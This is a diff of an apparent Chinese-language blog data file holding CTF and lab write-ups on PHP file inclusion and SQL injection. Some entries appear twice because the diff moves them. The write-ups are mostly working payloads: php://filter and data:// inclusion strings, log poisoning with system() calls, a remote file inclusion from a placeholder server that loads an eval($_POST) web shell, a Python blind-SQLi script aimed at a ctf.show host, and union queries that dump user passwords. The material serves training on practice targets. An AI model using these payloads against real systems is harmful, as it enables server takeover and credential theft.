+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过GET方式传入参数file，如果变量file不为空，则通过include函数进行文件包含。</p>
+</li>
+<li><p>构造payload<br>通过php伪协议构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>成功拿到flag</p>
+</li>
+</ol>
+<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过GET方式传入参数file，如果变量不为空，并且其中不含php，则通过include函数包含文件。</p>
+</li>
+<li><p>构造payload<br>由于不能包含php，所以不能使用php伪协议，改为用data伪协议绕过。<br>通过shell_code命令执行(``)读取flag.php的内容<br>或者用base64加密可以使用php<br>构造payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
+<p>成功拿到flag</p>
+</li>
+</ol>
+<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>目录地址<br>日志地址通常为<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">一般apache日志在类似目录下(/var/log/httpd/access.log)</span><br></pre></td></tr></table></figure>
+根据官方的Hint，可以尝试访问：<br><code>http://url/?file=/var/log/nginx/access.log</code><br>通过burp抓包可以得到user-agent和Referer字段，由此我们可以尝试在User-agent或Referer处注入命令执行代码</li>
+</ul>
+<ol start="2">
+<li>构造payload<br>首先注入能显示文件的代码<br><code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br>发现flag文件为fl0g.php后，执行显示的代码：<br><code>&lt;?php echo system(&#39;cat fl0g.php&#39;);?&gt;</code></li>
+</ol>
+<p>或者采用另一种方法：<br>远程文件包含<br>xxx为自己服务器地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>成功拿到flag</p>
+<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p>
+<h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>php:&#x2F;&#x2F;filter的妙用<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-web入门-反序列化</title>
     <url>/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始刷反序列化的题咯~</p>
@@ -2375,61 +2430,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
-    <title>ctfshow-web入门-文件包含</title>
-    <url>/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含不够熟练，需要增加熟练度。</p>
-<span id="more"></span>
-<h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><ol>
-<li><p>查看源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过GET方式传入参数file，如果变量file不为空，则通过include函数进行文件包含。</p>
-</li>
-<li><p>构造payload<br>通过php伪协议构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p>成功拿到flag</p>
-</li>
-</ol>
-<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><ol>
-<li><p>查看源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过GET方式传入参数file，如果变量不为空，并且其中不含php，则通过include函数包含文件。</p>
-</li>
-<li><p>构造payload<br>由于不能包含php，所以不能使用php伪协议，改为用data伪协议绕过。<br>通过shell_code命令执行(``)读取flag.php的内容<br>或者用base64加密可以使用php<br>构造payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
-<p>成功拿到flag</p>
-</li>
-</ol>
-<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><ol>
-<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>目录地址<br>日志地址通常为<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">一般apache日志在类似目录下(/var/log/httpd/access.log)</span><br></pre></td></tr></table></figure>
-根据官方的Hint，可以尝试访问：<br><code>http://url/?file=/var/log/nginx/access.log</code><br>通过burp抓包可以得到user-agent和Referer字段，由此我们可以尝试在User-agent或Referer处注入命令执行代码</li>
-</ul>
-<ol start="2">
-<li>构造payload<br>首先注入能显示文件的代码<br><code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br>发现flag文件为fl0g.php后，执行显示的代码：<br><code>&lt;?php echo system(&#39;cat fl0g.php&#39;);?&gt;</code></li>
-</ol>
-<p>或者采用另一种方法：<br>远程文件包含<br>xxx为自己服务器地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>成功拿到flag</p>
-<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p>
-<h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol>
-<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>php:&#x2F;&#x2F;filter的妙用<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFSHOW_web入门_SQL注入</title>
     <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<span id="more"></span>
@@ -2441,12 +2441,21 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
 <p>还有另一种payload(但我疑惑的是0c不是已经过滤了吗…)：<br><code>-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></p>
 <h1 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h1><p>考察了模糊查询，直接用上一题的第1个payload也可以，或者用模糊查询的方式：<br><code>-1&#39;%0cor%0cusername%0clike%0c&#39;%fla%</code></p>
 <h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><ol>
-<li>查看源码<br>查询语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>
-返回逻辑<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-查询结果<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-可以注意到，本题采用了POST传参，并且查询的字段名是pass<br>这一次过滤了更多的字符串，并且结果不会再返回flag信息了，只能知道查询到了多少条数据。<br>由此我们需要思考如何获得数据，比如可以通过布尔盲注。<br>由于我们知道flag的格式，只需要使用模糊查询方式便可确认，当 <code>user_count = 1</code> 时，我们可以知道查到了flag。<br>因此可以通过python写一个布尔盲注的脚本。脚本如下：<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f211f79d-cd92-40ed-bfe7-02240bde15a3.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)like(0x&#123;&#125;)&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 1;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>(<span class="params">has:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has+<span class="string">&#x27;%&#x27;</span>).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span> : p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span>+string.digits+string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(right(pd)):</span><br><span class="line">            flag +=c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-right(has:str)：传入一个字符串，返回一个新字符串。新字符串的格式为”（ctfshow_user）where（pass）like（0x{}）”，其中{}部分是传入的字符串被添加%号后经过encode编码并转化为十六进制字符串。</li>
+<li><p>查看源码<br>查询语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>返回逻辑</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>查询结果</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>可以注意到，本题采用了POST传参，并且查询的字段名是pass<br>这一次过滤了更多的字符串，并且结果不会再返回flag信息了，只能知道查询到了多少条数据。<br>由此我们需要思考如何获得数据，比如可以通过布尔盲注。<br>由于我们知道flag的格式，只需要使用模糊查询方式便可确认，当 <code>user_count = 1</code> 时，我们可以知道查到了flag。</p>
+</li>
+<li><p>构造payload</p>
+</li>
 </ol>
+<p>因此可以通过python写一个布尔盲注的脚本。脚本如下：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f211f79d-cd92-40ed-bfe7-02240bde15a3.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)like(0x&#123;&#125;)&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 1;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>(<span class="params">has:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has+<span class="string">&#x27;%&#x27;</span>).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span> : p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span>+string.digits+string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(right(pd)):</span><br><span class="line">            flag +=c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>right(has:str)：传入一个字符串，返回一个新字符串。新字符串的格式为”（ctfshow_user）where（pass）like（0x{}）”，其中{}部分是传入的字符串被添加%号后经过encode编码并转化为十六进制字符串。</p>
 <p>valid_payload(p: str)：传入一个字符串，返回一个布尔值。它将传入的字符串放在POST请求中的tableName参数中，向url发送POST请求，并判断返回内容中是否包含true_flag字符串（”$user_count &#x3D; 1;”）。</p>
 <p>接着是一个死循环，循环中使用了for语句，for语句中的循环变量c是字符串”{}-“+string.digits+string.ascii_lowercase的每一个字符（string.digits和string.ascii_lowercase分别是python的内置变量，包含所有数字字符和小写字母）。</p>
 <p>for语句中如果valid_payload函数返回true，则让flag+c，再输出flag的值。当匹配到最后时，跳出循环。</p>
@@ -2963,6 +2972,49 @@ right(has:str)：传入一个字符串，返回一个新字符串。新字符串
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_25+25a</title>
+    <url>/2022/11/17/sqli-labs_25+25a/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
+</ol>
+<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
+<ol start="2">
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_24</title>
     <url>/2022/11/17/sqli-labs_24/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
@@ -3034,49 +3086,6 @@ right(has:str)：传入一个字符串，返回一个新字符串。新字符串
 <h2 id="第26a关"><a href="#第26a关" class="headerlink" title="第26a关"></a>第26a关</h2><p>与26关相比，只是闭合方式变更为’)</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>使用url编码后，逐渐让语句变得不那么好读了…</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557886">Sqli-labs之Less-26和Less-26a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
